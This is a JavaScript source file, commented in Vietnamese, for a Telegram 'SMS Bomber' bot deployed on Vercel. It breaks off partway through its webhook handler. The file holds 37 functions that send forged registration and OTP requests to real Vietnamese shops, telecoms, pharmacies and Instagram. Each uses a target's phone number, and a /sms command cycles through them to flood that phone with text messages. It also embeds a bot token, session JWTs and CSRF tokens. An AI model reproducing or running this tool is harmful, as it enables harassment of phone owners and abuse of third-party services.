// api/sms.js
// Bot Telegram SMS Bomber - Đã chuyển đổi TOÀN BỘ từ Python sang JavaScript

import { Telegraf } from 'telegraf';

// ============================================
// 1. CẤU HÌNH BOT
// ============================================
const BOT_TOKEN = '8624782345:AAHjhUAwov-IDPsIXkiX2V10U8GcFqE0C-E'; // <<<< THAY BẰNG TOKEN THẬT
const bot = new Telegraf(BOT_TOKEN);

// ============================================
// 2. HÀM GỌI API CHUNG (có timeout, bắt lỗi)
// ============================================
async function callApi(url, options = {}) {
    const controller = new AbortController();
    const timeout = setTimeout(() => controller.abort(), 7000);
    try {
        const response = await fetch(url, { ...options, signal: controller.signal });
        clearTimeout(timeout);
        return response;
    } catch (error) {
        clearTimeout(timeout);
        return null;
    }
}

// ============================================
// 3. TOÀN BỘ CÁC HÀM SPAM (ĐÃ CHUYỂN TỪ PYTHON)
// ============================================

// 1. popeyes
async function popeyes(sdt) {
    const headers = {
        'Host': 'api.popeyes.vn', 'accept': 'application/json', 'x-client': 'WebApp',
        'user-agent': 'Mozilla/5.0 (Linux; Android 8.1.0; CPH1803 Build/OPM1.171019.026) AppleWebKit/537.36',
        'content-type': 'application/json', 'origin': 'https://popeyes.vn',
        'referer': 'https://popeyes.vn/', 'accept-language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
    };
    const data = JSON.stringify({ phone: sdt, firstName: "Cac", lastName: "Lo", email: "kong@gmail.com", password: "12345gdtg" });
    return callApi('https://api.popeyes.vn/api/v1/register', { method: 'POST', headers, body: data });
}

// 2. alfrescos
async function alfrescos(sdt) {
    const headers = {
        'Host': 'api.alfrescos.com.vn', 'accept': 'application/json, text/plain, */*',
        'brandcode': 'ALFRESCOS', 'devicecode': 'web', 'accept-language': 'vi-VN',
        'user-agent': 'Mozilla/5.0 (Linux; Android 8.1.0; CPH1803) AppleWebKit/537.36',
        'content-type': 'application/json', 'origin': 'https://alfrescos.com.vn',
        'referer': 'https://alfrescos.com.vn/',
    };
    const data = JSON.stringify({ phoneNumber: sdt, secureHash: "66148faf3cab6e527b8b044745e27dbd", deviceId: "", sendTime: 1693660146481, type: 1 });
    return callApi('https://api.alfrescos.com.vn/api/v1/User/SendSms?culture=vi-VN', { method: 'POST', headers, body: data });
}

// 3. bibabo
async function bibabo(sdt) {
    const headers = {
        "Host": "bibabo.vn", "Connection": "keep-alive", "Content-Length": "64",
        "Accept": "/", "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
        "X-Requested-With": "XMLHttpRequest", "sec-ch-ua-mobile": "?1",
        "User-Agent": "Mozilla/5.0 (Linux; Android 10; RMX1919) AppleWebKit/537.36",
        "Origin": "https://bibabo.vn", "Referer": "https://bibabo.vn/user/signupPhone",
        "Accept-Language": "vi-VN,vi;q=0.9",
    };
    const payload = new URLSearchParams({ phone: sdt, token: "UkkqP4eM9cqQBNTTmbUOJinoUZmcEnSE8wwqJ6VS" });
    return callApi("https://bibabo.vn/user/verify-phone", { method: 'POST', headers, body: payload.toString() });
}

// 4. thantaioilo
async function thantaioilo(phone) {
    const headers = {
        "Host": "api.thantaioi.vn", "content-type": "application/json", "accept-language": "vi",
        "user-agent": "Mozilla/5.0 (Linux; Android 10; RMX1919) AppleWebKit/537.36",
        "origin": "https://thantaioi.vn", "referer": "https://thantaioi.vn/user/login",
    };
    const data = JSON.stringify({ phone: "84" + phone.substring(1) });
    return callApi("https://api.thantaioi.vn/api/user/send-one-time-password", { method: 'POST', headers, body: data });
}

// 5. tv360
async function tv360(phone) {
    const headers = {
        "Host": "m.tv360.vn", "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Linux; Android 10; moto e7i power) AppleWebKit/537.36",
        "Origin": "http://m.tv360.vn", "Referer": "http://m.tv360.vn/login",
    };
    const data = JSON.stringify({ msisdn: "0" + phone.substring(1) });
    return callApi("http://m.tv360.vn/public/v1/auth/get-otp-login", { method: 'POST', headers, body: data });
}

// 6. fpt
async function fpt(phone) {
    const headers = {
        "Host": "fptshop.com.vn", "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
        "x-requested-with": "XMLHttpRequest", "user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; CPH1805) AppleWebKit/537.36",
        "origin": "https://fptshop.com.vn", "referer": "https://fptshop.com.vn/",
    };
    const data = new URLSearchParams({ phone: phone });
    return callApi("https://fptshop.com.vn/api-data/loyalty/Home/Verification", { method: 'POST', headers, body: data.toString() });
}

// 7. oldloship
async function oldloship(phone) {
    const headers = {
        "Host": "mocha.lozi.vn", "content-type": "application/json", "x-city-id": "50",
        "accept-language": "vi_VN", "user-agent": "Mozilla/5.0 (Linux; Android 10; SM-G981B) AppleWebKit/537.36",
        "x-lozi-client": "1", "x-access-token": "unknown", "origin": "https://loship.vn",
        "referer": "https://loship.vn",
    };
    const data = JSON.stringify({ device: "Android 8.1.0", platform: "Chrome/104.0.0.0", countryCode: "84", phoneNumber: phone.substring(1) });
    return callApi("https://mocha.lozi.vn/v6/invites/use-app", { method: 'POST', headers, body: data });
}

// 8. vayvnd
async function vayvnd(sdt) {
    const headers = {
        'Host': 'api.vayvnd.vn', 'accept': 'application/json', 'accept-language': 'vi-VN',
        'user-agent': 'Mozilla/5.0 (Linux; Android 8.1.0; CPH1803) AppleWebKit/537.36',
        'site-id': '3', 'content-type': 'application/json; charset=utf-8',
        'origin': 'https://vayvnd.vn', 'referer': 'https://vayvnd.vn/',
    };
    const data = JSON.stringify({ phone: sdt, utm: [{ utm_source: "google", utm_medium: "organic", referrer: "https://www.google.com/" }], sourceSite: 3 });
    return callApi('https://api.vayvnd.vn/v2/users', { method: 'POST', headers, body: data });
}

// 9. tamo
async function tamo(phone) {
    const headers = {
        "Host": "api.tamo.vn", "content-type": "application/json;charset=UTF-8",
        "user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; CPH1805) AppleWebKit/537.36",
        "origin": "https://www.tamo.vn", "referer": "https://www.tamo.vn/",
    };
    const data = JSON.stringify({ mobilePhone: { number: "0" + phone.substring(1) } });
    return callApi("https://api.tamo.vn/web/public/client/phone/sms-code-ts", { method: 'POST', headers, body: data });
}

// 10. meta
async function meta(sdt) {
    const headers = {
        'Host': 'meta.vn', 'accept': 'application/json, text/plain, */*',
        'user-agent': 'Mozilla/5.0 (Linux; Android 8.1.0; CPH1803) AppleWebKit/537.36',
        'content-type': 'application/json', 'origin': 'https://meta.vn',
        'referer': 'https://meta.vn/account/register', 'accept-language': 'vi-VN,vi;q=0.9',
    };
    const data = JSON.stringify({ api_args: { lgUser: sdt, act: "send", type: "phone" }, api_method: "CheckExist" });
    return callApi('https://meta.vn/app_scripts/pages/AccountReact.aspx?api_mode=1', { method: 'POST', headers, body: data });
}

// 11. gapo
async function gapo(sdt) {
    const headers = {
        "Host": "api.gapo.vn", "Content-Type": "application/json",
        "Authorization": "Bearer", "User-Agent": "Mozilla/5.0 (Linux; Android 10; RMX1919) AppleWebKit/537.36",
        "Origin": "https://www.gapo.vn", "Referer": "https://www.gapo.vn/",
        "Accept-Language": "vi-VN,vi;q=0.9",
    };
    const data = JSON.stringify({ device_id: "30a1bfa0-533f-45e9-be60-b48fb8977df2", phone_number: "+84-" + sdt.substring(1), otp_type: 0 });
    return callApi("https://api.gapo.vn/auth/v2.0/signup", { method: 'POST', headers, body: data });
}

// 12. robocash
async function robocash(phone) {
    const headers = {
        'authority': 'robocash.vn', 'accept-language': 'vi-VN,vi;q=0.9',
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'origin': 'https://robocash.vn', 'referer': 'https://robocash.vn/register',
        'user-agent': 'Mozilla/5.0 (Linux; Android 13; SM-A225F) AppleWebKit/537.36',
    };
    const data = new URLSearchParams({ phone: phone, _token: 'iSkFRbkX3IamHEhtVZAi9AZ3PLRlaXMjX1hJJS3I' });
    return callApi('https://robocash.vn/register/phone-resend', { method: 'POST', headers, body: data.toString() });
}

// 13. vieon
async function vieon(sdt) {
    const headers = {
        'Host': 'api.vieon.vn', 'accept': 'application/json, text/plain, */*',
        'authorization': 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE2OTM4MzU2OTgsImp0aSI6IjRjYTdmMTBiYjk2MTUzNjZjNzUxYjRmNGFjNjY3ZTZiIiwiYXVkIjoiIiwiaWF0IjoxNjkzNjYyODk4LCJpc3MiOiJWaWVPbiIsIm5iZiI6MTY5MzY2Mjg5Nywic3ViIjoiYW5vbnltb3VzXzU3ZjNmZmQ3N2FkMjA5YTYyNmMxZWE2MDdkMGM0Nzc1LWNkOWI3MDM1MDZlMWRlMDU3M2NhMDRjNjY2YzFiNjZkLTE2OTM2NjI4OTgiLCJzY29wZSI6ImNtOnJlYWQgY2FzOnJlYWQgY2FzOndyaXRlIGJpbGxpbmc6cmVhZCIsImRpIjoiNTdmM2ZmZDc3YWQyMDlhNjI2YzFlYTYwN2QwYzQ3NzUtY2Q5YjcwMzUwNmUxZGUwNTczY2EwNGM2NjZjMWI2NmQtMTY5MzY2Mjg5OCIsInVhIjoiTW96aWxsYS81LjAiLCJkdCI6Im1vYmlsZV93ZWIiLCJtdGgiOiJhbm9ueW1vdXNfbG9naW4iLCJtZCI6IkFuZHJvaWQgOC4xLjAifQ.fQERPMuQAu0FKAm7xTBECSNxeDJlhGyKwy4C-TUU-JI',
        'user-agent': 'Mozilla/5.0 (Linux; Android 8.1.0; CPH1803) AppleWebKit/537.36',
        'content-type': 'application/x-www-form-urlencoded', 'origin': 'https://vieon.vn',
        'referer': 'https://vieon.vn/', 'accept-language': 'vi-VN,vi;q=0.9',
    };
    const data = new URLSearchParams({
        phone_number: sdt, password: '1234gdtg', given_name: '',
        device_id: '57f3ffd77ad209a626c1ea607d0c4775', platform: 'mobile_web',
        model: 'Android 8.1.0', push_token: '', device_name: 'Chrome/116',
        device_type: 'desktop', isMorePlatform: 'true', ui: '012021',
    });
    return callApi('https://api.vieon.vn/backend/user/register/mobile?platform=mobile_web&ui=012021', { method: 'POST', headers, body: data.toString() });
}

// 14. instagram
async function instagram(phone) {
    const headers = {
        "Content-Type": "application/x-www-form-urlencoded", "X-Requested-With": "XMLHttpRequest",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        "x-csrftoken": "EKIzZefCrMss0ypkr2VjEWZ1I7uvJ9BD",
    };
    const data = new URLSearchParams({ email_or_username: phone, recaptcha_challenge_field: "" });
    return callApi("https://www.instagram.com/accounts/account_recovery_send_ajax/", { method: 'POST', headers, body: data.toString() });
}

// 15. winmart
async function winmart(sdt) {
    const headers = {
        'Host': 'api-crownx.winmart.vn', 'accept': 'application/json',
        'authorization': 'Bearer undefined', 'user-agent': 'Mozilla/5.0 (Linux; Android 8.1.0; CPH1803) AppleWebKit/537.36',
        'origin': 'https://winmart.vn', 'referer': 'https://winmart.vn/', 'accept-language': 'vi-VN,vi;q=0.9',
    };
    return callApi(`https://api-crownx.winmart.vn/as/api/web/v1/send-otp?phoneNo=${sdt}`, { method: 'GET', headers });
}

// 16. concung
async function concung(phone) {
    const headers = {
        "Host": "concung.com", "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
        "x-requested-with": "XMLHttpRequest", "user-agent": "Mozilla/5.0 (Linux; Linux x86_64; en-US) AppleWebKit/535.30",
        "origin": "https://concung.com", "referer": "https://concung.com/dang-nhap.html",
        "accept-language": "vi-VN,vi;q=0.9",
    };
    const data = new URLSearchParams({ ajax: "1", classAjax: "AjaxLogin", methodAjax: "sendOtpLogin", customer_phone: phone, id_customer: "0", momoapp: "0", back: "khach-hang.html" });
    return callApi("https://concung.com/ajax.html", { method: 'POST', headers, body: data.toString() });
}

// 17. funring
async function funring(phone) {
    const headers = {
        "Host": "funring.vn", "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Linux; Linux x86_64; en-US) AppleWebKit/535.30",
        "Origin": "http://funring.vn", "Referer": "http://funring.vn/module/register_mobile.jsp",
        "Accept-Language": "vi-VN,vi;q=0.9",
    };
    const data = JSON.stringify({ username: phone.substring(1) });
    return callApi("http://funring.vn/api/v1.0.1/jersey/user/getotp", { method: 'POST', headers, body: data });
}

// 18. fptplay
async function fptplay(sdt) {
    const headers = {
        'Host': 'api.fptplay.net', 'accept': 'application/json, text/plain, */*',
        'user-agent': 'Mozilla/5.0 (Linux; Android 8.1.0; CPH1803) AppleWebKit/537.36',
        'x-did': 'D23DB2566887A76C', 'content-type': 'application/json; charset=UTF-8',
        'origin': 'https://fptplay.vn', 'referer': 'https://fptplay.vn/', 'accept-language': 'vi-VN,vi;q=0.9',
    };
    const data = JSON.stringify({ phone: sdt, country_code: "VN", client_id: "vKyPNd1iWHodQVknxcvZoWz74295wnk8" });
    return callApi('https://api.fptplay.net/api/v7.1_w/user/otp/register_otp?st=WWHbn-h7R9s60bp1YARxeg&e=1693668280&device=Chrome(version%253A116.0.0.0)&drm=1', { method: 'POST', headers, body: data });
}

// 19. vietid
async function vietid(phone) {
    // Cần lấy csrf token trước
    const csrfRes = await callApi("https://oauth.vietid.net/rb/login?next=https://oauth.vietid.net/rb/authorize?client_id=83958575a2421647&response_type=code&redirect_uri=https://enbac.com/member_login.php");
    let csrf = "";
    if (csrfRes) {
        const text = await csrfRes.text();
        const match = text.match(/name="csrf-token" value="([^"]+)"/);
        if (match) csrf = match[1];
    }
    if (!csrf) return null;
    
    const headers = {
        "Host": "oauth.vietid.net", "content-type": "application/x-www-form-urlencoded",
        "user-agent": "Mozilla/5.0 (Linux; Linux x86_64; en-US) AppleWebKit/535.30",
        "origin": "https://oauth.vietid.net", "referer": "https://oauth.vietid.net/rb/login",
        "accept-language": "vi-VN,vi;q=0.9",
    };
    const data = new URLSearchParams({ "csrf-token": csrf, account: phone });
    return callApi("https://oauth.vietid.net/rb/login?next=https://oauth.vietid.net/rb/authorize", { method: 'POST', headers, body: data.toString() });
}

// 20. viettel
async function viettel(phone) {
    const headers = {
        'Content-Type': 'application/json;charset=UTF-8', 'Origin': 'https://vietteltelecom.vn',
        'Referer': 'https://vietteltelecom.vn/dang-nhap', 'User-Agent': 'Mozilla/5.0',
        'X-CSRF-TOKEN': 'dS0MwhelCkb96HCH9kVlEd3CxX8yyiQim71Acpr6', 'X-Requested-With': 'XMLHttpRequest',
    };
    const data = JSON.stringify({ phone: phone, type: '' });
    return callApi('https://vietteltelecom.vn/api/get-otp-login', { method: 'POST', headers, body: data });
}

// 21. dkvt
async function dkvt(phone) {
    const headers = {
        'Content-Type': 'application/json;charset=UTF-8', 'Origin': 'https://viettel.vn',
        'Referer': 'https://viettel.vn/dang-ky', 'User-Agent': 'Mozilla/5.0',
        'X-CSRF-TOKEN': 'HXW7C6QsV9YPSdPdRDLYsf8WGvprHEwHxMBStnBK', 'X-Requested-With': 'XMLHttpRequest',
    };
    const data = JSON.stringify({ msisdn: phone });
    return callApi('https://viettel.vn/api/get-otp', { method: 'POST', headers, body: data });
}

// 22. tgdd
async function tgdd(sdt) {
    const headers = {
        'Host': 'www.thegioididong.com', 'x-requested-with': 'XMLHttpRequest',
        'user-agent': 'Mozilla/5.0 (Linux; Android 8.1.0; CPH1803) AppleWebKit/537.36',
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'origin': 'https://www.thegioididong.com', 'referer': 'https://www.thegioididong.com/lich-su-mua-hang/dang-nhap',
        'accept-language': 'vi-VN,vi;q=0.9',
    };
    const data = new URLSearchParams({
        phoneNumber: sdt, isReSend: 'false', sendOTPType: '1',
        __RequestVerificationToken: 'CfDJ8Btx1b7t0ERJkQbRPSImfvKmEuGLjG73Nu3OcrziLWklJso95JQREBpSricRSiqNboVDzkobizZ8BC1MYLuRHBg0MFyAI4296BdzGcULqSvabfm1n-kajaC3BTIGmM2yamwUAzHMBo56K9VcLGn9G68',
    });
    return callApi('https://www.thegioididong.com/lich-su-mua-hang/LoginV2/GetVerifyCode', { method: 'POST', headers, body: data.toString() });
}

// 23. kiot
async function kiot(phone) {
    const headers = {
        'authority': 'www.kiotviet.vn', 'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'origin': 'https://www.kiotviet.vn', 'referer': 'https://www.kiotviet.vn/dang-ky/',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
    };
    const data = new URLSearchParams({
        phone: '+84' + phone.substring(1), code: 'bancainayne', name: 'Cai Nit',
        email: 'ahihi123982@gmail.com', zone: 'An Giang - Huyện Châu Phú',
        merchant: 'bancainayne', username: '0972936627', industry: 'Điện thoại & Điện máy',
        ref_code: '', industry_id: '65', phone_input: "0338607465",
    });
    return callApi('https://www.kiotviet.vn/wp-content/themes/kiotviet/TechAPI/getOTP.php', { method: 'POST', headers, body: data.toString() });
}

// 24. moneydonglo
async function moneydonglo(phone) {
    const headers = {
        "Host": "api.moneydong.vip", "content-type": "application/x-www-form-urlencoded",
        "user-agent": "Mozilla/5.0 (Linux; Linux x86_64; en-US) AppleWebKit/535.30",
        "origin": "https://h5.moneydong.vip", "referer": "https://h5.moneydong.vip/",
        "accept-language": "vi-VN,vi;q=0.9",
    };
    const data = new URLSearchParams({ phone: phone.substring(1), type: "2", ctype: "1", chntoken: "69ad075c94c279e43608c5d50b77e8b9" });
    return callApi("https://api.moneydong.vip/h5/LoginMessage_ultimate", { method: 'POST', headers, body: data.toString() });
}

// 25. pizzahut
async function pizzahut(sdt) {
    const headers = {
        "Host": "pizzahut.vn", "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Linux; Android 10; RMX1919) AppleWebKit/537.36",
        "Origin": "https://pizzahut.vn", "Referer": "https://pizzahut.vn/signup",
        "Accept-Language": "vi-VN,vi;q=0.9",
    };
    const data = JSON.stringify({ keyData: "appID=vn.pizzahut&lang=Vi&ver=1.0.0&clientType=2&udId=%22%22&phone=" + sdt });
    return callApi("https://pizzahut.vn/callApiStorelet/user/registerRequest", { method: 'POST', headers, body: data });
}

// 26. nhathuocankhang
async function nhathuocankhang(sdt) {
    const headers = {
        'Host': 'www.nhathuocankhang.com', 'x-requested-with': 'XMLHttpRequest',
        'user-agent': 'Mozilla/5.0 (Linux; Android 8.1.0; CPH1803) AppleWebKit/537.36',
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'origin': 'https://www.nhathuocankhang.com', 'referer': 'https://www.nhathuocankhang.com/lich-su-mua-hang/dang-nhap',
        'accept-language': 'vi-VN,vi;q=0.9',
    };
    const data = new URLSearchParams({
        phoneNumber: sdt, isReSend: 'false', sendOTPType: '1',
        __RequestVerificationToken: 'CfDJ8Btx1b7t0ERJkQbRPSImfvIkx_XgfKyE4czujvNxaAfv-MMWo9wOPHefqEtwPEVHDRuyl_T_wvv5Z_4xwdsEMumCuozvudOcuN1pdJS4qccI79A292sfeOBWlV4Pn-ULzeEAddY2V3Jl_1HXnntsKtA',
    });
    return callApi('https://www.nhathuocankhang.com/lich-su-mua-hang/LoginV2/GetVerifyCode', { method: 'POST', headers, body: data.toString() });
}

// 27. nhathuoclongchau
async function nhathuoclongchau(sdt) {
    const headers = {
        'Host': 'api.nhathuoclongchau.com.vn', 'access-control-allow-origin': '*',
        'accept': 'application/json, text/plain, */*', 'order-channel': '1',
        'user-agent': 'Mozilla/5.0 (Linux; Android 8.1.0; CPH1803) AppleWebKit/537.36',
        'x-channel': 'EStore', 'content-type': 'application/json',
        'origin': 'https://nhathuoclongchau.com.vn', 'referer': 'https://nhathuoclongchau.com.vn/',
        'accept-language': 'vi-VN,vi;q=0.9',
    };
    const data = JSON.stringify({ phoneNumber: sdt, otpType: 0, fromSys: "WEBKHLC" });
    return callApi('https://api.nhathuoclongchau.com.vn/lccus/is/user/new-send-verification', { method: 'POST', headers, body: data });
}

// 28. riviu
async function riviu(sdt) {
    const headers = {
        'Host': 'production-account.riviu.co', 'device_id': '2895593903', 'language': 'vi',
        'user-agent': 'Mozilla/5.0 (Linux; Android 8.1.0; CPH1803) AppleWebKit/537.36',
        'content-type': 'application/json;charset=UTF-8', 'region_uuid': '112f7e2e9da240be937daa66b1c4d1ce',
        'accept': 'application/json, text/plain, */*', 'platform': 'web', 'app_version': '3.1.6',
        'origin': 'https://riviu.vn', 'referer': 'https://riviu.vn/', 'accept-language': 'vi-VN,vi;q=0.9',
    };
    const data = JSON.stringify({ country_prefix: "84", phone: sdt });
    return callApi('https://production-account.riviu.co/v1.0/check/phone', { method: 'POST', headers, body: data });
}

// 29. phuclong
async function phuclong(sdt) {
    const headers = {
        'Host': 'api-crownx.winmart.vn', 'accept': 'application/json',
        'authorization': 'Bearer undefined', 'user-agent': 'Mozilla/5.0 (Linux; Android 8.1.0; CPH1803) AppleWebKit/537.36',
        'content-type': 'application/json', 'origin': 'https://order.phuclong.com.vn',
        'referer': 'https://order.phuclong.com.vn/', 'accept-language': 'vi-VN,vi;q=0.9',
    };
    const data = JSON.stringify({ phoneNumber: sdt, fullName: "Lo Cac", email: "KAka@gmail.com", password: "12345cc@@@" });
    return callApi('https://api-crownx.winmart.vn/as/api/plg/v1/user/register', { method: 'POST', headers, body: data });
}

// 30. ICANKID
async function ICANKID(sdt) {
    const headers = {
        'Host': 'id.icankid.vn', 'Connection': 'keep-alive',
        'User-Agent': 'Mozilla/5.0 (Linux; Android 8.1.0; CPH1803) AppleWebKit/537.36',
        'content-type': 'application/json', 'Accept': '*/*', 'Origin': 'https://id.icankid.vn',
        'Referer': 'https://id.icankid.vn/auth', 'Accept-Language': 'vi-VN,vi;q=0.9',
    };
    const data = JSON.stringify({ phone: sdt, challenge_code: "7020a94b1bb3973b1f44e1c5ef9dfaf4b997e4886ecfd33fc176836a157260eb", challenge_method: "SHA256" });
    return callApi('https://id.icankid.vn/api/otp/challenge/', { method: 'POST', headers, body: data });
}

// 31. medigoapp
async function medigoapp(sdt) {
    const headers = {
        'Host': 'production-api.medigoapp.com', 'accept': 'application/json, text/plain, */*',
        'user-agent': 'Mozilla/5.0 (Linux; Android 8.1.0; CPH1803) AppleWebKit/537.36',
        'origin': 'https://www.medigoapp.com', 'referer': 'https://www.medigoapp.com/',
        'accept-language': 'vi-VN,vi;q=0.9',
    };
    return callApi('https://production-api.medigoapp.com/login/v2/flow?phone=+84' + sdt.substring(1), { method: 'GET', headers });
}

// 32. ecogreen
async function ecogreen(sdt) {
    const headers = {
        'Host': 'ecogreen.com.vn', 'accept': 'application/json, text/plain, */*',
        'user-agent': 'Mozilla/5.0 (Linux; Android 8.1.0; CPH1803) AppleWebKit/537.36',
        'content-type': 'application/json;charset=UTF-8', 'origin': 'https://ecogreen.com.vn',
        'referer': 'https://ecogreen.com.vn/', 'accept-language': 'vi-VN,vi;q=0.9',
    };
    const data = JSON.stringify({ phone: sdt });
    return callApi('https://ecogreen.com.vn/api/auth/register/send-otp', { method: 'POST', headers, body: data });
}

// 33. rrvay
async function rrvay(sdt) {
    const headers = {
        'Host': 'api.rrvay.com', 'user-agent': 'Mozilla/5.0 (Linux; Android 8.1.0; CPH1803) AppleWebKit/537.36',
        'content-type': 'text/plain;charset=UTF-8', 'accept': '*/*',
        'origin': 'https://h5.rrvay.com', 'referer': 'https://h5.rrvay.com/',
        'accept-language': 'vi-VN,vi;q=0.9',
    };
    const rawData = { baseParams: { platformId: "android", deviceType: "h5", deviceIdKh: "20230903094918rjmxmirinydw76lc4ieb37sk4qvglj2o15f3759f5abe4ce5ac4193706e033170ae91001b0063470b68ac979438ea2db0md9lazrze1zb0i7zjn4l4n3leysyscq41", termSysVersion: "8.1.0", termModel: "CPH1803", brand: "OPPO", termId: "", appType: "6", appVersion: "2.0.0", pValue: "", position: { lon: null, lat: null }, bizType: "202", appName: "Alo Credit", packageName: "com.rrvay.h5", screenResolution: "720,1520" }, clientTypeFlag: "h5", token: "", phoneNumber: sdt, timestamp: "1693705774265", bizParams: { phoneNum: "0338607282", code: null, type: 200, channelCode: "H1h82" }, sign: "532b0dcd6b2edfa91886cbdade889842" };
    return callApi('https://api.rrvay.com/app/member/sendSmsCode', { method: 'POST', headers, body: JSON.stringify(rawData) });
}

// 34. pharmacity
async function pharmacity(sdt) {
    const headers = {
        'Host': 'api-gateway.pharmacity.vn', 'user-agent': 'Mozilla/5.0 (Linux; Android 8.1.0; CPH1803) AppleWebKit/537.36',
        'content-type': 'application/json', 'accept': '*/*', 'origin': 'https://www.pharmacity.vn',
        'referer': 'https://www.pharmacity.vn/', 'accept-language': 'vi-VN,vi;q=0.9',
    };
    const data = JSON.stringify({ phone: sdt, referral: "" });
    return callApi('https://api-gateway.pharmacity.vn/customers/register/otp', { method: 'POST', headers, body: data });
}

// 35. ghn
async function ghn(sdt) {
    const headers = {
        'Host': 'online-gateway.ghn.vn', 'accept': 'application/json, text/plain, */*',
        'user-agent': 'Mozilla/5.0 (Linux; Android 8.1.0; CPH1803) AppleWebKit/537.36',
        'content-type': 'application/json', 'origin': 'https://sso.ghn.vn',
        'referer': 'https://sso.ghn.vn/', 'accept-language': 'vi-VN,vi;q=0.9',
    };
    const data = JSON.stringify({ phone: sdt, type: "register" });
    return callApi('https://online-gateway.ghn.vn/sso/public-api/v2/client/sendotp', { method: 'POST', headers, body: data });
}

// 36. beecow
async function beecow(sdt) {
    const headers = {
        'Host': 'api.beecow.com', 'content-type': 'application/json; text/plain',
        'accept': 'application/json, text/plain, application/stream+json', 'ati': '2403440711961',
        'platform': 'WEB', 'user-agent': 'Mozilla/5.0 (Linux; Android 8.1.0; CPH1803) AppleWebKit/537.36',
        'time-zone': 'Asia/Saigon', 'origin': 'https://admin.gosell.vn',
        'referer': 'https://admin.gosell.vn/', 'accept-language': 'vi-VN,vi;q=0.9',
    };
    const data = JSON.stringify({ password: "12345cc@", displayName: "", locationCode: "VN-SG", langKey: "vi", mobile: { countryCode: "+84", phoneNumber: sdt } });
    return callApi('https://api.beecow.com/api/register/gosell', { method: 'POST', headers, body: data });
}

// 37. thepizzacompany
async function thepizzacompany(sdt) {
    const headers = {
        'Host': 'thepizzacompany.vn', 'cache-control': 'max-age=0', 'upgrade-insecure-requests': '1',
        'origin': 'https://thepizzacompany.vn', 'content-type': 'application/x-www-form-urlencoded',
        'user-agent': 'Mozilla/5.0 (Linux; Android 8.1.0; CPH1803) AppleWebKit/537.36',
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9',
        'referer': 'https://thepizzacompany.vn/register?returnUrl=%2Fpizza',
        'accept-language': 'vi-VN,vi;q=0.9',
    };
    const data = new URLSearchParams({
        FirstName: 'Lo Lon', Username: sdt, Email: 'HShshshs@gmail.com',
        Password: '1233cc', ConfirmPassword: '1233cc',
        AcceptPrivacyPolicy: 'true', 'register-button': '',
        __RequestVerificationToken: 'CfDJ8Cl_WAA5AJ9Ml4vmCZFOjMdrlLMrud6K3IHdSZxUUIGNBmPu2NHdtR6SHPq_OLXvUCmZmeWlARmF_2QZrZj47-6QIO-HDXbRp9ajdWrDab0qxf_OnqKrr3x3qt6z8rkmVhekg8Mczlgb6nHQVjo5Omc',
    });
    return callApi('https://thepizzacompany.vn/register?returnurl=/pizza', { method: 'POST', headers, body: data.toString() });
}

// ============================================
// 4. DANH SÁCH TẤT CẢ HÀM SPAM
// ============================================
const spamFunctions = [
    popeyes, alfrescos, bibabo, thantaioilo, tv360, fpt, oldloship, vayvnd, tamo, meta,
    gapo, robocash, vieon, instagram, winmart, concung, funring, fptplay, vietid, viettel,
    dkvt, tgdd, kiot, moneydonglo, pizzahut, nhathuocankhang, nhathuoclongchau, riviu,
    phuclong, ICANKID, medigoapp, ecogreen, rrvay, pharmacity, ghn, beecow, thepizzacompany,
];

// ============================================
// 5. LOGIC BOT TELEGRAM
// ============================================
bot.start((ctx) => {
    ctx.reply('🔥 Chào bạn! Bot SMS Bomber đây.\n\n' +
               '📋 Lệnh: /sms [số điện thoại] [số lần]\n' +
               '📱 Ví dụ: /sms 0912345678 3\n\n' +
               '⚠️ Số lần tối đa: 10 (giới hạn Vercel)\n' +
               '⏱️ Bot sẽ chạy khoảng 10 giây rồi tự dừng.');
});

bot.command('sms', async (ctx) => {
    const args = ctx.message.text.split(' ');
    
    if (args.length < 3) {
        return ctx.reply('❌ Thiếu tham số. Ví dụ: /sms 0912345678 5');
    }

    const phone = args[1];
    const amount = parseInt(args[2], 10);

    // Kiểm tra số điện thoại hợp lệ
    if (!/^0\d{9,10}$/.test(phone)) {
        return ctx.reply('❌ Số điện thoại không hợp lệ. Ví dụ: 0912345678');
    }

    if (isNaN(amount) || amount < 1 || amount > 10) {
        return ctx.reply('⚠️ Số lần phải từ 1 đến 10 (giới hạn Vercel 10s).');
    }

    // Báo bắt đầu
    const startMsg = await ctx.reply(`🚀 BẮT ĐẦU!\n📱 SĐT: ${phone}\n🔄 Số lần: ${amount}\n⏳ Đợi ~${amount * 2}s...`);

    // Chạy ngầm
    let successCount = 0;
    let failCount = 0;

    for (let i = 0; i < amount; i++) {
        const func1 = spamFunctions[i % spamFunctions.length];
        const func2 = spamFunctions[(i + 1) % spamFunctions.length];
        
        // Gọi 2 API cùng lúc
        const [res1, res2] = await Promise.allSettled([func1(phone), func2(phone)]);
        
        if (res1.value) successCount++; else failCount++;
        if (res2.value) successCount++; else failCount++;
        
        // Nghỉ 1-2 giây
        await new Promise(resolve => setTimeout(resolve, 1500));
    }

    // Báo kết quả
    ctx.telegram.editMessageText(
        startMsg.chat.id, startMsg.message_id, undefined,
        `✅ HOÀN THÀNH!\n📱 SĐT: ${phone}\n✅ Gửi OK: ${successCount}\n❌ Lỗi: ${failCount}\n\n💡 Lưu ý: Đây là bot dùng API miễn phí, tỉ lệ thành công không cao!`
    );
});

// ============================================
// 6. WEBHOOK HANDLER CHO VERCEL
// ============================================
export default async function handler(req, res) {
    if (req.method === 'POST') {
        try {
